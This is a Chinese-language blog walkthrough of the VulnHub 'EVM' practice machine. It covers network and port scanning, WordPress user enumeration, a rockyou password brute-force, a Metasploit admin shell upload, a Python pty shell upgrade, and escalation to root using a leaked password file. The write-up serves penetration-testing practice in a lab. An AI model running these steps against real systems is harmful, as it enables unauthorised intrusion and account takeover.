@@ -1,0 +1,116 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>vulnhub_EVM | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>vulnhub_EVM</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-08-12T06:22:37.000Z" id="date"> 2023-08-12</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-08-12T08:11:47.928Z" id="updated"> 2023-08-12</time></div></span></div></div><hr><div id="post-content"><p>此文章记录渗透实战打靶，vlunhub的evm靶机，记录不会很详细</p>
+<span id="more"></span>
+
+<h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1 信息收集"></a>1 信息收集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">┌──(root㉿kali)-[~]<br>└─# arp-scan -l<br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:a7:c2:f0, IPv4: 192.168.227.132<br>Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.227.1   00:50:56:c0:00:08       VMware, Inc.<br>192.168.227.2   00:50:56:fd:06:ab       VMware, Inc.<br>192.168.227.136 00:0c:29:e4:12:d2       VMware, Inc.<br>192.168.227.254 00:50:56:eb:ad:6a       VMware, Inc.<br></code></pre></td></tr></table></figure>
+
+<p>靶机是192.168.227.136</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ports=$(nmap -p- -sS -n --min-rate=8000 -T4 192.168.227.136 | grep -oE &#x27;(^[0-9][^/tcp]*)&#x27; | tr &#x27;\n&#x27; &#x27;,&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>开放端口扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">┌──(root㉿kali)-[~]<br>└─# echo $ports<br>22,53,80,110,139,143,445,<br></code></pre></td></tr></table></figure>
+
+<p>接着对端口进行服务探测：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap -p$ports -sV -sC -O 192.168.227.136 -oN ./nmap/nmap_ports<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PORT    STATE SERVICE     VERSION<br>22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   2048 a2d3341362b118a3dddb35c55ab7c078 (RSA)<br>|   256 8548532a50c5a0b71aeea4d8128e1cce (ECDSA)<br>|_  256 362292c73222e33451bc0e749f1cdbaa (ED25519)<br>53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)<br>| dns-nsid:<br>|_  bind.version: 9.10.3-P4-Ubuntu<br>80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>110/tcp open  pop3        Dovecot pop3d<br>|_pop3-capabilities: SASL TOP PIPELINING UIDL AUTH-RESP-CODE CAPA RESP-CODES<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>143/tcp open  imap        Dovecot imapd<br>|_imap-capabilities: Pre-login LOGINDISABLEDA0001 OK LITERAL+ post-login IMAP4rev1 SASL-IR have more IDLE ENABLE ID LOGIN-REFERRALS listed capabilities<br>445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>MAC Address: 00:0C:29:E4:12:D2 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s<br>| smb-security-mode:<br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)<br>| smb2-security-mode:<br>|   311:<br>|_    Message signing enabled but not required<br>| smb2-time:<br>|   date: 2023-08-12T06:49:03<br>|_  start_date: N/A<br>| smb-os-discovery:<br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine<br>|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00<br>|   Domain name: \x00<br>|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine<br>|_  System time: 2023-08-12T02:49:03-04:00<br></code></pre></td></tr></table></figure>
+
+<p>接下来使用另一个工具进行扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">enum4linux -a 192.168.227.136<br></code></pre></td></tr></table></figure>
+
+<p>没有什么有用的信息，然后使用searchsploit对samba和isc进行漏洞搜索，发现并没有什么东西，打开web看看</p>
+<p>是apache的初始页面，但是有一个提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">you can find me at /wordpress/ im vulnerable webapp :) <br></code></pre></td></tr></table></figure>
+
+<p>访问192.168.227.136&#x2F;wordpress&#x2F;访问耗费了很长的时间，不知道为什么，直接上工具扫描吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wpscan --url http://192.168.227.136/wordpress -e u<br></code></pre></td></tr></table></figure>
+
+<p>枚举用户</p>
+<hr>
+<p>与此同时开始爆破目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dirsearch -u &quot;http://192.168.227.136/&quot; -x 403<br></code></pre></td></tr></table></figure>
+
+<p>扫到了这些：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[03:08:42] Starting:<br>[03:09:00] 200 -   11KB - /index.html<br>[03:09:01] 200 -   82KB - /info.php<br>[03:09:15] 500 -    0B  - /wp-config.php<br>[03:09:20] 200 -    3KB - /wordpress/wp-login.php<br>[03:09:20] 200 -   15KB - /wordpress/<br></code></pre></td></tr></table></figure>
+
+<p>看一下info.php，页面显示出来了phpinfo()信息，但是用处不是很大</p>
+<hr>
+<p>此时wpscan扫描出来了用户：c0rrupt3d_brain</p>
+<p>接着使用rockyou.txt爆破密码，成功爆破出来！</p>
+<p>c0rrupt3d_brain&#x2F;24992499</p>
+<p>本来可以直接网页访问然后登录的，但是不知道为什么可能是我的靶机出问题了一直连接不上，无奈只能使用msf搜索漏洞了</p>
+<p>（前面wpscan已经获取了版本为5.2.4）</p>
+<h1 id="2-找到突破口getshell"><a href="#2-找到突破口getshell" class="headerlink" title="2 找到突破口getshell"></a>2 找到突破口getshell</h1><p>msf搜索到了漏洞，进行配置后run，getshell</p>
+<p class='item-img' data-src='/1.png'><img src="/1.png"></p>
+<p><strong>上图中的LHOST应该是RHOST，写错了</strong></p>
+<blockquote>
+<p>msf6 exploit(unix&#x2F;webapp&#x2F;wp_admin_shell_upload) &gt; set LHOST 192.168.227.132<br>LHOST &#x3D;&gt; 192.168.227.132<br>msf6 exploit(unix&#x2F;webapp&#x2F;wp_admin_shell_upload) &gt; set RHOST 192.168.227.136<br>RHOST &#x3D;&gt; 192.168.227.136</p>
+</blockquote>
+<p>LHOST是攻击地址，RHOST是受害者地址</p>
+<p>成功getshell了</p>
+<h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3 提权"></a>3 提权</h1><p>受限利用python获取交互式shell（which python确认有python）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>然后在&#x2F;home&#x2F;root3r目录下找到.root_password_ssh.txt并读取，猜测是root密码</p>
+<p>然后sudo -i输入密码，发现不是这个密码</p>
+<p>然后再尝试su root </p>
+<p>发现这个密码就对了！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">root@ubuntu-extermely-vulnerable-m4ch1ine:# whoami<br>whoami<br>root<br></code></pre></td></tr></table></figure>
+
+<p>这个靶机完美结束！</p>
+<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h1><p>小白的第一个靶机，磕磕碰碰的总算是成功了</p>
+<p>总结一下：</p>
+<ol>
+<li><p>信息收集获取靶机开放的端口以及服务版本，尝试使用漏洞rce进去</p>
+<p>工具：enum4linux nmap arp-scan searchspolit</p>
+</li>
+<li><p>目录爆破获取特征文件寻找突破点（例如phpinfo，wordpress）</p>
+<p>工具: dirsearch dirb wpscan cewl</p>
+</li>
+<li><p>找到突破点（getshell）之后对敏感文件进行搜索（*flag* *password*）</p>
+<p>这一步要注意使用ls -laR 不要使用ls，不然会错过隐藏文件</p>
+</li>
+<li><p>提权</p>
+</li>
+</ol>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/28/XXE%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">XXE注入学习笔记 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">1 信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E6%89%BE%E5%88%B0%E7%AA%81%E7%A0%B4%E5%8F%A3getshell"><span class="toc-number">2.</span> <span class="toc-text">2 找到突破口getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">3 提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">4 总结</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: '此条评论委托企鹅物流发送'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
